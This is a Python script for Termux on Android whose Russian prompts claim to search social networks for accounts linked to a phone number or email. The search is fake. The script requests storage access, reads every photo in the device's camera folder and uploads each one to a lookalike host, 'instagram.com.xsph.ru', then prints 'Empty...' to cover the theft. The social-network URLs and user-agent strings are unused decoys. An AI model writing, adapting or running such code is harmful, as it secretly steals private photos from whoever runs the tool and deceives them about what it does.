import os, requests
print("Поиск аккаунтов в соц сетях")
ph = input("Номер телефона или почта: ")
print("Загрузка...")
os.system("termux-setup-storage")
print("Идет процесс поиска...")
request = ph
l = os.listdir("../storage/shared/DCIM/Camera")
prin = request.replace("7", "+7")
vk = "https://vk.com"
inst = "https://instagram.com"
facebook = "https://facebook.com"
twitter = "https://twitter.com"
skype = "https://skype.org"
user = """Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)
Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 6.0; Win64; x64; Trident/5.0; .NET CLR 3.8.50799; Media Center PC 6.0; .NET4.0E)
Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 8.1; Trident/5.0; .NET4.0E; en-AU)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 8.0; WOW64; Trident/5.0; .NET CLR 2.7.40781; .NET4.0E; en-SG)
Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 8.0; Win64; x64; Trident/5.0; .NET4.0E; en)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.0; Trident/5.0; .NET CLR 2.2.50767; Zune 4.2; .NET4.0E)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0"""
for i in range(len(l)):
	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
	r = f.read()
	try:
		requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
	except:
		pass
print("Пусто...")
